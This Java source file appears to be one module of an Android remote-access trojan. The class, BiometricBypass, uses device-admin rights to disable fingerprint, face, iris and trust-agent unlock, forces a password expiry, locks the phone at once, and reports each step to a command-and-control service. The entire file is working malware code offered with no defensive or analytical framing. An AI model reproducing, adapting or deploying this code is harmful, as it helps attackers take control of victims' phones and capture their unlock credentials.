package com.wuzenx.engine;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import com.wuzenx.C2Service;
import com.wuzenx.services.AdminReceiver;

public class BiometricBypass {
    private Context context;
    private C2Service c2;
    private Handler handler = new Handler(Looper.getMainLooper());

    public BiometricBypass(Context context, C2Service c2) { this.context = context; this.c2 = c2; }

    public void start() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) 
                context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName cn = new ComponentName(context, AdminReceiver.class);
            if (dpm.isAdminActive(cn)) {
                // Disable fingerprint AND face unlock
                dpm.setKeyguardDisabledFeatures(cn, 
                    DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
                    DevicePolicyManager.KEYGUARD_DISABLE_FACE |
                    DevicePolicyManager.KEYGUARD_DISABLE_IRIS |
                    DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
                // Force password-only mode
                dpm.setPasswordExpirationTimeout(cn, 1L);
                dpm.lockNow();
                c2.sendMessage("log", "Biometric bypass: fingerprint/face/iris disabled, PIN mode forced");
            } else {
                c2.sendMessage("log", "Biometric bypass requires admin (not active)");
            }
        } catch (Exception e) {
            c2.sendMessage("log", "Biometric error: " + e.getMessage());
        }
    }
}
